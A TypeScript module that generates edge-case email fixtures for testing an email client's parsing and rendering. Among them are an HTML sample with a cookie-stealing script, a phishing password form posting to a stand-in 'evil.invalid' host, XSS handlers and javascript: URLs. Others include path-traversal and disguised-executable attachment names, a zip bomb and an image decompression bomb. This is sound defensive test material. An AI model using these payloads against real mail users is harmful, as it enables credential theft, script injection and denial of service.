import { address, PEOPLE } from "../../lib/cast";
import { pdf, png, truncate, zip } from "./binary";
import {
  attachment,
  base64Lines,
  CRLF,
  entity,
  type Header,
  inlineImage,
  multipartBody,
  type Part,
  textPart,
} from "./mime";
import { randomBytes, words } from "./rng";

const KB = 1024;
const MB = 1024 * KB;
const BASE_TIME = Date.UTC(2024, 5, 10, 8, 0, 0);
const DOMAIN = "edge.test";

export interface MailCase {
  name: string;
  build: () => Buffer | Buffer[];
}

function messageId(name: string, n = 0): string {
  return `<edge-${name}-${n}@${DOMAIN}>`;
}

function std(name: string, index: number, subject = name): Header[] {
  return [
    ["From", `Edge Sender <sender@${DOMAIN}>`],
    ["To", address(PEOPLE.ana)],
    ["Subject", subject],
    ["Date", new Date(BASE_TIME + index * 60_000).toUTCString()],
    ["Message-ID", messageId(name)],
    ["MIME-Version", "1.0"],
  ];
}

function withHeaders(base: Header[], override: Header[]): Header[] {
  const names = new Set(override.map(([n]) => n.toLowerCase()));
  return [...base.filter(([n]) => !names.has(n.toLowerCase())), ...override];
}

function plain(name: string, index: number, body: string, extra: Header[] = []) {
  return entity(
    withHeaders(std(name, index), [["Content-Type", "text/plain; charset=utf-8"], ...extra]),
    body,
  );
}

function html(name: string, index: number, body: string, extra: Header[] = []) {
  return entity(
    withHeaders(std(name, index), [["Content-Type", "text/html; charset=utf-8"], ...extra]),
    body,
  );
}

function mixed(
  name: string,
  index: number,
  parts: Part[],
  extra: Header[] = [],
  boundary = `edge-${name}-boundary`,
) {
  return entity(
    withHeaders(std(name, index), [
      ["Content-Type", `multipart/mixed; boundary="${boundary}"`],
      ...extra,
    ]),
    multipartBody(boundary, parts),
  );
}

function wrapLines(text: string, width = 76): string {
  const out: string[] = [];
  for (let i = 0; i < text.length; i += width) out.push(text.slice(i, i + width));
  return out.join(CRLF);
}

function ics(events: string[]): string {
  return [
    "BEGIN:VCALENDAR",
    "VERSION:2.0",
    "PRODID:-//Metis E2E Edge//EN",
    "METHOD:REQUEST",
    ...events,
    "END:VCALENDAR",
  ].join(CRLF);
}

function vevent(uid: string, fields: string[]): string {
  return ["BEGIN:VEVENT", `UID:${uid}`, "DTSTAMP:20260910T080000Z", ...fields, "END:VEVENT"].join(
    CRLF,
  );
}

function nestedEml(depth: number): Buffer {
  let inner = entity(
    [
      ["From", `Depth ${depth} <depth${depth}@${DOMAIN}>`],
      ["Subject", `Innermost of ${depth}`],
      ["Content-Type", "text/plain; charset=utf-8"],
    ],
    "the bottom of the forwarding chain",
  );
  for (let level = depth - 1; level >= 0; level--) {
    const boundary = `fwd-${level}`;
    inner = entity(
      [
        ["From", `Forwarder ${level} <fwd${level}@${DOMAIN}>`],
        ["Subject", `Fwd level ${level}`],
        ["MIME-Version", "1.0"],
        ["Content-Type", `multipart/mixed; boundary="${boundary}"`],
      ],
      multipartBody(boundary, [
        textPart(`forwarding level ${level}`),
        {
          headers: [
            ["Content-Type", "message/rfc822"],
            ["Content-Disposition", `attachment; filename="level-${level + 1}.eml"`],
          ],
          body: inner,
        },
      ]),
    );
  }
  return inner;
}

const HOSTILE_HTML = `<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.invalid/">
<style>body{background:url(javascript:alert(1))} *{animation:spin 0.001s infinite}</style>
<script>document.cookie="stolen="+document.cookie</script>
</head><body onload="alert(1)">
<img src="https://tracker.invalid/pixel.gif?id=ana" width="1" height="1">
<img src="x" onerror="alert(2)">
<iframe src="https://evil.invalid/frame"></iframe>
<form action="https://evil.invalid/steal" method="post"><input name="password" type="password"><button>Verify account</button></form>
<a href="javascript:alert(3)">Click to confirm</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg0KTwvc2NyaXB0Pg==">Open invoice</a>
<svg onload="alert(5)"><circle r="10"/></svg>
<object data="https://evil.invalid/x.swf"></object>
<p style="display:none">hidden text</p>
</body></html>`;

export const MAIL_CASES: MailCase[] = [
  {
    name: "min-headers-only",
    build: () => Buffer.from(`From: a@${DOMAIN}${CRLF}${CRLF}`),
  },
  { name: "min-bare-crlf", build: () => Buffer.from(CRLF) },
  {
    name: "min-no-separator",
    build: () => Buffer.from(`Subject: no blank line after headers${CRLF}From: b@${DOMAIN}`),
  },
  {
    name: "min-one-char-body",
    build: () => plain("min-one-char-body", 1, "x"),
  },
  {
    name: "min-empty-subject",
    build: () =>
      entity(
        withHeaders(std("min-empty-subject", 2), [
          ["Subject", ""],
          ["Content-Type", "text/plain"],
        ]),
        "empty subject",
      ),
  },
  {
    name: "min-no-from",
    build: () =>
      entity(
        std("min-no-from", 3).filter(([n]) => n !== "From"),
        "no From header",
      ),
  },
  {
    name: "min-whitespace-body",
    build: () => plain("min-whitespace-body", 4, ` \t${CRLF}${CRLF}\u{A0}\u{200B}${CRLF}`),
  },

  {
    name: "max-subject-998",
    build: () =>
      plain("max-subject-998", 10, "subject is exactly the RFC 5322 line limit", [
        ["Subject", "S".repeat(998 - "Subject: ".length)],
      ]),
  },
  {
    name: "max-subject-folded-100k",
    build: () =>
      plain("max-subject-folded-100k", 11, "very long folded subject", [
        ["Subject", wrapLines(words(15_000, 11), 70).replace(/\r\n/g, `${CRLF} `)],
      ]),
  },
  {
    name: "max-body-plain-20mb",
    build: () => plain("max-body-plain-20mb", 12, wrapLines(words(2_700_000, 12))),
  },
  {
    name: "max-body-single-line-5mb",
    build: () => plain("max-body-single-line-5mb", 13, "A".repeat(5 * MB)),
  },
  {
    name: "max-html-nesting-10k",
    build: () =>
      html(
        "max-html-nesting-10k",
        14,
        `<html><body>${"<div>".repeat(10_000)}deep${"</div>".repeat(10_000)}</body></html>`,
      ),
  },
  {
    name: "max-html-table-50k-rows",
    build: () =>
      html(
        "max-html-table-50k-rows",
        15,
        `<table>${Array.from({ length: 50_000 }, (_, i) => `<tr><td>${i}</td><td>${words(6, i)}</td></tr>`).join("")}</table>`,
      ),
  },
  {
    name: "max-recipients-4000",
    build: () =>
      plain("max-recipients-4000", 16, "four thousand recipients", [
        ["To", Array.from({ length: 2000 }, (_, i) => `R${i} <r${i}@${DOMAIN}>`).join(`,${CRLF} `)],
        ["Cc", Array.from({ length: 2000 }, (_, i) => `c${i}@${DOMAIN}`).join(`,${CRLF} `)],
      ]),
  },
  {
    name: "max-references-5000",
    build: () =>
      plain("max-references-5000", 17, "enormous References header", [
        [
          "References",
          Array.from({ length: 5000 }, (_, i) => `<ref-${i}@${DOMAIN}>`).join(`${CRLF} `),
        ],
        ["In-Reply-To", `<ref-4999@${DOMAIN}>`],
      ]),
  },
  {
    name: "max-attachments-500",
    build: () =>
      mixed("max-attachments-500", 18, [
        textPart("five hundred attachments"),
        ...Array.from({ length: 500 }, (_, i) =>
          attachment(`file-${i}.txt`, "text/plain", `attachment number ${i}`),
        ),
      ]),
  },
  {
    name: "max-links-20k",
    build: () =>
      html(
        "max-links-20k",
        19,
        `<p>${Array.from({ length: 20_000 }, (_, i) => `<a href="https://links.edge.test/${i}">link ${i}</a>`).join(" ")}</p><a href="https://links.edge.test/${"x".repeat(64 * KB)}">64KB URL</a>`,
      ),
  },

  {
    name: "img-1x1",
    build: () =>
      mixed("img-1x1", 20, [
        textPart("a 1x1 image"),
        attachment("pixel.png", "image/png", png(1, 1, "solid")),
      ]),
  },
  {
    name: "img-dimensions-10000x10000",
    build: () =>
      mixed("img-dimensions-10000x10000", 21, [
        textPart("tiny file, 100 megapixel decode"),
        attachment("bomb.png", "image/png", png(10_000, 10_000, "solid")),
      ]),
  },
  {
    name: "img-noise-3000x2500",
    build: () =>
      mixed("img-noise-3000x2500", 22, [
        textPart("incompressible 22 MB image"),
        attachment("noise.png", "image/png", png(3000, 2500, "noise", 22)),
      ]),
  },
  {
    name: "img-truncated-png",
    build: () =>
      mixed("img-truncated-png", 23, [
        textPart("half a PNG"),
        attachment("broken.png", "image/png", truncate(png(800, 600, "noise", 23), 0.5)),
      ]),
  },
  {
    name: "img-mislabeled",
    build: () =>
      mixed("img-mislabeled", 24, [
        textPart("says JPEG, is a PDF"),
        attachment("photo.jpg", "image/jpeg", pdf(["not a photo"])),
      ]),
  },
  {
    name: "img-inline-cid-missing",
    build: () =>
      html(
        "img-inline-cid-missing",
        25,
        `<p>Broken inline image:</p><img src="cid:does-not-exist@${DOMAIN}">`,
      ),
  },
  {
    name: "img-inline-100",
    build: () =>
      entity(
        withHeaders(std("img-inline-100", 26), [
          ["Content-Type", `multipart/related; boundary="rel-100"`],
        ]),
        multipartBody("rel-100", [
          textPart(
            Array.from({ length: 100 }, (_, i) => `<img src="cid:img${i}@${DOMAIN}">`).join(""),
            "text/html",
          ),
          ...Array.from({ length: 100 }, (_, i) =>
            inlineImage(`img${i}@${DOMAIN}`, "image/png", png(64, 64, "noise", 1000 + i)),
          ),
        ]),
      ),
  },

  {
    name: "enc-bogus-charset",
    build: () =>
      entity(
        withHeaders(std("enc-bogus-charset", 30), [
          ["Content-Type", "text/plain; charset=x-bogus-9000"],
        ]),
        "charset nobody knows",
      ),
  },
  {
    name: "enc-latin1-label-utf8-bytes",
    build: () =>
      entity(
        withHeaders(std("enc-latin1-label-utf8-bytes", 31), [
          ["Content-Type", "text/plain; charset=iso-8859-1"],
          ["Content-Transfer-Encoding", "8bit"],
        ]),
        "Caf\u{E9} \u{2014} \u{65E5}\u{672C}\u{8A9E} \u{2014} \u{1F389} labelled latin-1",
      ),
  },
  {
    name: "enc-invalid-utf8",
    build: () =>
      entity(
        withHeaders(std("enc-invalid-utf8", 32), [
          ["Content-Type", "text/plain; charset=utf-8"],
          ["Content-Transfer-Encoding", "8bit"],
        ]),
        Buffer.from([
          0x62, 0x61, 0x64, 0x20, 0xc3, 0x28, 0xa0, 0xa1, 0xe2, 0x28, 0xa1, 0xf0, 0x28, 0x8c, 0xbc,
          0xff, 0xfe,
        ]),
      ),
  },
  {
    name: "enc-rfc2047-broken",
    build: () =>
      plain("enc-rfc2047-broken", 33, "broken encoded words", [
        ["Subject", "=?utf-8?B?!!!not-base64!!!?= =?bogus?Q?x?= =?utf-8?Q?unterminated"],
        ["From", "=?utf-8?B?8J+Ukg==?= <enc@edge.test>"],
      ]),
  },
  {
    name: "enc-base64-broken",
    build: () =>
      entity(
        withHeaders(std("enc-base64-broken", 34), [
          ["Content-Type", "text/plain; charset=utf-8"],
          ["Content-Transfer-Encoding", "base64"],
        ]),
        "SGVsbG8gd29y!!!bGQ=\r\n====\r\nnot*base64*at*all",
      ),
  },
  {
    name: "enc-qp-invalid",
    build: () =>
      entity(
        withHeaders(std("enc-qp-invalid", 35), [
          ["Content-Type", "text/plain; charset=utf-8"],
          ["Content-Transfer-Encoding", "quoted-printable"],
        ]),
        "bad escapes =ZZ =4 =\r\nsoft break at the very end =",
      ),
  },
  {
    name: "enc-unicode-torture",
    build: () =>
      plain(
        "enc-unicode-torture",
        36,
        "\u{1F469}\u{200D}\u{1F469}\u{200D}\u{1F467}\u{200D}\u{1F466} \u{202E}evil.exe\u{202C} Z\u{337}\u{322}\u{31B}\u{339}\u{356}\u{353}\u{317}\u{359}\u{32D}\u{32E}\u{32C}\u{323}\u{313}\u{34A}\u{30B}\u{300}a\u{336}\u{322}\u{327}\u{354}\u{31F}\u{349}\u{355}\u{353}\u{313}l\u{337}\u{322}\u{329}\u{33C}\u{313}\u{351}\u{1F5}\u{335}\u{322}\u{31C}\u{317}\u{30E}o \u{200B}\u{200C}\u{200D}\u{FEFF} \u{645}\u{631}\u{62D}\u{628}\u{627} \u{5E9}\u{5DC}\u{5D5}\u{5DD} \u{1D573}\u{1D58A}\u{1D591}\u{1D591}\u{1D594}",
        [
          [
            "Subject",
            "\u{202E}gnp.exe \u{1F469}\u{200D}\u{1F469}\u{200D}\u{1F467}\u{200D}\u{1F466} \u{645}\u{631}\u{62D}\u{628}\u{627}\u{200B}",
          ],
          ["From", "\u{202E}evil\u{202C} <torture@edge.test>"],
        ],
      ),
  },
  {
    name: "enc-8bit-no-cte",
    build: () =>
      entity(
        withHeaders(std("enc-8bit-no-cte", 37), [["Content-Type", "text/plain"]]),
        Buffer.from("raw 8-bit \u{FC}mlaut with no transfer encoding", "utf8"),
      ),
  },

  {
    name: "mime-missing-terminator",
    build: () =>
      entity(
        withHeaders(std("mime-missing-terminator", 40), [
          ["Content-Type", `multipart/mixed; boundary="never-closed"`],
        ]),
        `--never-closed${CRLF}Content-Type: text/plain${CRLF}${CRLF}the closing boundary never comes${CRLF}`,
      ),
  },
  {
    name: "mime-boundary-absent",
    build: () =>
      entity(
        withHeaders(std("mime-boundary-absent", 41), [
          ["Content-Type", `multipart/mixed; boundary="nowhere"`],
        ]),
        "declared multipart, no boundary anywhere",
      ),
  },
  {
    name: "mime-no-boundary-param",
    build: () =>
      entity(
        withHeaders(std("mime-no-boundary-param", 42), [["Content-Type", "multipart/alternative"]]),
        "multipart without a boundary parameter",
      ),
  },
  {
    name: "mime-empty-multipart",
    build: () =>
      entity(
        withHeaders(std("mime-empty-multipart", 43), [
          ["Content-Type", `multipart/mixed; boundary="empty"`],
        ]),
        `--empty--${CRLF}`,
      ),
  },
  {
    name: "mime-nested-100",
    build: () => {
      let body: Buffer = Buffer.from("innermost text");
      let type = "text/plain; charset=utf-8";
      for (let level = 0; level < 100; level++) {
        const boundary = `nest-${level}`;
        body = multipartBody(boundary, [{ headers: [["Content-Type", type]], body }]);
        type = `multipart/mixed; boundary="${boundary}"`;
      }
      return entity(withHeaders(std("mime-nested-100", 44), [["Content-Type", type]]), body);
    },
  },
  {
    name: "mime-duplicate-headers",
    build: () =>
      Buffer.from(
        [
          `From: First <first@${DOMAIN}>`,
          `From: Second <second@${DOMAIN}>`,
          "Subject: first subject",
          "Subject: second subject",
          "Date: Mon, 10 Jun 2024 09:00:00 +0000",
          "Date: Tue, 11 Jun 2024 09:00:00 +0000",
          `Message-ID: ${messageId("mime-duplicate-headers")}`,
          "",
          "duplicate headers",
        ].join(CRLF),
      ),
  },
  {
    name: "mime-garbage-headers",
    build: () =>
      Buffer.from(
        [
          `From: garbage@${DOMAIN}`,
          "this line has no colon",
          ":empty-name",
          "X-\u0001Control: value",
          `Subject: garbage headers`,
          "",
          "body",
        ].join(CRLF),
      ),
  },
  {
    name: "mime-lf-only",
    build: () =>
      Buffer.from(
        [
          `From: lf@${DOMAIN}`,
          "Subject: bare LF line endings",
          `Message-ID: ${messageId("mime-lf-only")}`,
          "Content-Type: text/plain",
          "",
          "line one",
          "line two",
        ].join("\n"),
      ),
  },

  {
    name: "date-epoch",
    build: () =>
      plain("date-epoch", 50, "dated 1970", [["Date", "Thu, 01 Jan 1970 00:00:00 +0000"]]),
  },
  {
    name: "date-year-9999",
    build: () =>
      plain("date-year-9999", 51, "dated 9999", [["Date", "Fri, 31 Dec 9999 23:59:59 +0000"]]),
  },
  {
    name: "date-garbage",
    build: () =>
      plain("date-garbage", 52, "unparseable date", [["Date", "sometime next tuesday-ish"]]),
  },
  {
    name: "date-tz-extremes",
    build: () =>
      plain("date-tz-extremes", 53, "+1400 zone", [["Date", "Wed, 12 Jun 2024 23:59:59 +1400"]]),
  },
  {
    name: "date-missing",
    build: () =>
      entity(
        std("date-missing", 54).filter(([n]) => n !== "Date"),
        "no Date header",
      ),
  },

  {
    name: "thread-self-reference",
    build: () =>
      plain("thread-self-reference", 60, "replies to itself", [
        ["In-Reply-To", messageId("thread-self-reference")],
        ["References", messageId("thread-self-reference")],
      ]),
  },
  {
    name: "thread-duplicate-message-id",
    build: () => [
      plain("thread-duplicate-message-id", 61, "first copy"),
      plain("thread-duplicate-message-id", 62, "second copy, same Message-ID"),
    ],
  },
  {
    name: "thread-loop",
    build: () => [
      entity(
        withHeaders(std("thread-loop", 63, "loop A"), [
          ["Message-ID", messageId("loop", 1)],
          ["References", messageId("loop", 2)],
          ["Content-Type", "text/plain"],
        ]),
        "A refs B",
      ),
      entity(
        withHeaders(std("thread-loop", 64, "loop B"), [
          ["Message-ID", messageId("loop", 2)],
          ["References", messageId("loop", 1)],
          ["Content-Type", "text/plain"],
        ]),
        "B refs A",
      ),
    ],
  },
  {
    name: "thread-200-replies",
    build: () =>
      Array.from({ length: 200 }, (_message, i) =>
        entity(
          withHeaders(
            std("thread-200-replies", 65 + i, i === 0 ? "Long thread" : "Re: Long thread"),
            [
              ["Message-ID", messageId("thread-200", i)],
              ...(i > 0
                ? ([
                    ["In-Reply-To", messageId("thread-200", i - 1)],
                    [
                      "References",
                      Array.from({ length: i }, (_, j) => messageId("thread-200", j)).join(" "),
                    ],
                  ] as Header[])
                : []),
              ["Content-Type", "text/plain; charset=utf-8"],
            ],
          ),
          `reply ${i}: ${words(40, i)}`,
        ),
      ),
  },

  {
    name: "att-zero-byte",
    build: () =>
      mixed("att-zero-byte", 300, [
        textPart("empty attachment"),
        attachment("empty.bin", "application/octet-stream", Buffer.alloc(0)),
      ]),
  },
  {
    name: "att-no-filename",
    build: () =>
      mixed("att-no-filename", 301, [
        textPart("attachment without a name"),
        attachment(null, "application/pdf", pdf(["nameless"])),
      ]),
  },
  {
    name: "att-hostile-filenames",
    build: () =>
      mixed("att-hostile-filenames", 302, [
        textPart("hostile filenames"),
        attachment("../../../../etc/passwd", "text/plain", "root:x:0:0"),
        attachment("CON", "text/plain", "reserved on windows"),
        attachment(`${"n".repeat(300)}.txt`, "text/plain", "300 char name"),
        attachment("\u{202E}txt.exe", "application/octet-stream", "rtl override"),
        attachment("invoice.pdf.exe", "application/octet-stream", "double extension"),
        attachment("  ", "text/plain", "blank name"),
        attachment(
          "\u{65E5}\u{672C}\u{8A9E} \u{30D5}\u{30A1}\u{30A4}\u{30EB} \u{1F389}.txt",
          "text/plain",
          "unicode name",
        ),
      ]),
  },
  {
    name: "att-binary-30mb",
    build: () =>
      mixed("att-binary-30mb", 303, [
        textPart("30 MB of random bytes"),
        attachment("random.bin", "application/octet-stream", randomBytes(30 * MB, 303)),
      ]),
  },
  {
    name: "att-pdf-empty",
    build: () =>
      mixed("att-pdf-empty", 304, [
        textPart("0 byte PDF"),
        attachment("empty.pdf", "application/pdf", Buffer.alloc(0)),
      ]),
  },
  {
    name: "att-pdf-corrupt",
    build: () =>
      mixed("att-pdf-corrupt", 305, [
        textPart("truncated PDF"),
        attachment(
          "corrupt.pdf",
          "application/pdf",
          truncate(pdf(["Invoice INV-9 total 10.00 USD"]), 0.4),
        ),
      ]),
  },
  {
    name: "att-pdf-2000-pages",
    build: () =>
      mixed("att-pdf-2000-pages", 306, [
        textPart("very long PDF"),
        attachment(
          "statement.pdf",
          "application/pdf",
          pdf(Array.from({ length: 2000 }, (_, i) => `Page ${i + 1}: ${words(30, i)}`)),
        ),
      ]),
  },
  {
    name: "att-ics-invalid",
    build: () =>
      mixed("att-ics-invalid", 307, [
        textPart("broken invite"),
        attachment(
          "invite.ics",
          "text/calendar",
          "BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nDTSTART:not-a-date\r\nSUMMARY;BROKEN\r\n",
        ),
      ]),
  },
  {
    name: "att-ics-10000-events",
    build: () =>
      mixed("att-ics-10000-events", 308, [
        textPart("ten thousand events"),
        attachment(
          "many.ics",
          "text/calendar",
          ics(
            Array.from({ length: 10_000 }, (_, i) =>
              vevent(`many-${i}@${DOMAIN}`, [
                `DTSTART:2026${String((i % 12) + 1).padStart(2, "0")}${String((i % 28) + 1).padStart(2, "0")}T090000Z`,
                "DURATION:PT30M",
                `SUMMARY:Event ${i}`,
              ]),
            ),
          ),
        ),
      ]),
  },
  {
    name: "att-ics-rrule-secondly",
    build: () =>
      mixed("att-ics-rrule-secondly", 309, [
        textPart("infinite secondly recurrence"),
        attachment(
          "forever.ics",
          "text/calendar",
          ics([
            vevent(`secondly@${DOMAIN}`, [
              "DTSTART:20261001T000000Z",
              "DURATION:PT1S",
              "RRULE:FREQ=SECONDLY",
              "SUMMARY:Every second forever",
            ]),
          ]),
        ),
      ]),
  },
  {
    name: "att-vcf-malformed",
    build: () =>
      mixed("att-vcf-malformed", 310, [
        textPart("broken contact"),
        attachment(
          "contact.vcf",
          "text/vcard",
          "BEGIN:VCARD\r\nVERSION:9.9\r\nFN\r\nEMAIL;TYPE=:\r\nTEL:;;;;\r\n",
        ),
      ]),
  },
  {
    name: "att-vcf-1000-contacts",
    build: () =>
      mixed("att-vcf-1000-contacts", 311, [
        textPart("a thousand contacts"),
        attachment(
          "everyone.vcf",
          "text/vcard",
          Array.from(
            { length: 1000 },
            (_, i) =>
              `BEGIN:VCARD\r\nVERSION:3.0\r\nFN:Person ${i}\r\nEMAIL:p${i}@${DOMAIN}\r\nTEL:+1555${String(i).padStart(7, "0")}\r\nEND:VCARD`,
          ).join(CRLF),
        ),
      ]),
  },
  {
    name: "att-pkpass-corrupt-zip",
    build: () =>
      mixed("att-pkpass-corrupt-zip", 312, [
        textPart("corrupt wallet pass"),
        attachment(
          "pass.pkpass",
          "application/vnd.apple.pkpass",
          truncate(zip({ "pass.json": "{}" }), 0.5),
        ),
      ]),
  },
  {
    name: "att-pkpass-no-pass-json",
    build: () =>
      mixed("att-pkpass-no-pass-json", 313, [
        textPart("wallet pass without pass.json"),
        attachment(
          "pass.pkpass",
          "application/vnd.apple.pkpass",
          zip({ "icon.png": png(29, 29, "solid") }),
        ),
      ]),
  },
  {
    name: "att-pkpass-invalid-json",
    build: () =>
      mixed("att-pkpass-invalid-json", 314, [
        textPart("pass.json is not json"),
        attachment(
          "pass.pkpass",
          "application/vnd.apple.pkpass",
          zip({ "pass.json": "{ this is: not json," }),
        ),
      ]),
  },
  {
    name: "att-pkpass-zip-bomb",
    build: () =>
      mixed("att-pkpass-zip-bomb", 315, [
        textPart("200 MB pass.json compressed to almost nothing"),
        attachment(
          "bomb.pkpass",
          "application/vnd.apple.pkpass",
          zip({ "pass.json": new Uint8Array(200 * MB).fill(0x20) }),
        ),
      ]),
  },
  {
    name: "att-eml-nested-30",
    build: () =>
      mixed("att-eml-nested-30", 316, [
        textPart("thirty levels of forwarding"),
        {
          headers: [
            ["Content-Type", "message/rfc822"],
            ["Content-Disposition", `attachment; filename="chain.eml"`],
          ],
          body: nestedEml(30),
        },
      ]),
  },
  {
    name: "att-mislabeled-zip-as-pdf",
    build: () =>
      mixed("att-mislabeled-zip-as-pdf", 317, [
        textPart("PDF extension, zip bytes"),
        attachment("invoice.pdf", "application/pdf", zip({ "a.txt": "surprise" })),
      ]),
  },

  {
    name: "jsonld-invalid",
    build: () =>
      html(
        "jsonld-invalid",
        400,
        `<script type="application/ld+json">{ "@type": "Order", "orderNumber": "A-1", </script><p>invalid JSON-LD</p>`,
      ),
  },
  {
    name: "jsonld-1mb",
    build: () =>
      html(
        "jsonld-1mb",
        401,
        `<script type="application/ld+json">${JSON.stringify({ "@type": "Order", orderNumber: "BIG-1", acceptedOffer: Array.from({ length: 8000 }, (_, i) => ({ "@type": "Offer", itemOffered: { name: words(12, i) }, price: i })) })}</script><p>a megabyte of JSON-LD</p>`,
      ),
  },
  {
    name: "jsonld-deep-5000",
    build: () =>
      html(
        "jsonld-deep-5000",
        402,
        `<script type="application/ld+json">${'{"a":'.repeat(5000)}1${"}".repeat(5000)}</script><p>deeply nested JSON-LD</p>`,
      ),
  },
  {
    name: "jsonld-wrong-types",
    build: () =>
      html(
        "jsonld-wrong-types",
        403,
        `<script type="application/ld+json">{"@type":"ParcelDelivery","trackingNumber":{"nested":true},"trackingUrl":42,"expectedArrivalUntil":"not a date","carrier":null,"partOfOrder":[1,2,3]}</script><p>wrong types in JSON-LD</p>`,
      ),
  },
  {
    name: "jsonld-hostile-urls",
    build: () =>
      html(
        "jsonld-hostile-urls",
        404,
        `<script type="application/ld+json">{"@type":"ParcelDelivery","trackingNumber":"EVIL1","trackingUrl":"javascript:alert(1)","potentialAction":{"@type":"TrackAction","url":"data:text/html,<script>alert(1)</script>"}}</script><p>hostile URLs in JSON-LD</p>`,
      ),
  },
  {
    name: "jsonld-50-blocks",
    build: () =>
      html(
        "jsonld-50-blocks",
        405,
        `${Array.from(
          { length: 50 },
          (_, i) =>
            `<script type="application/ld+json">{"@type":"Order","orderNumber":"MULTI-${i}"}</script>`,
        ).join("")}<p>fifty JSON-LD blocks</p>`,
      ),
  },

  {
    name: "html-hostile",
    build: () => html("html-hostile", 500, HOSTILE_HTML),
  },
  {
    name: "html-no-visible-text",
    build: () =>
      html(
        "html-no-visible-text",
        501,
        `<html><body><div style="display:none">x</div><img src="cid:none"></body></html>`,
      ),
  },
  {
    name: "html-css-20mb",
    build: () =>
      html(
        "html-css-20mb",
        502,
        `<style>${Array.from({ length: 400_000 }, (_, i) => `.c${i}{color:#${(i % 0xffffff).toString(16).padStart(6, "0")}}`).join("")}</style><p>styled</p>`,
      ),
  },
  {
    name: "html-base64-inline-data-uri-15mb",
    build: () =>
      html(
        "html-base64-inline-data-uri-15mb",
        503,
        `<img src="data:image/png;base64,${base64Lines(png(2500, 2000, "noise", 503), 1 << 30)}">`,
      ),
  },
];
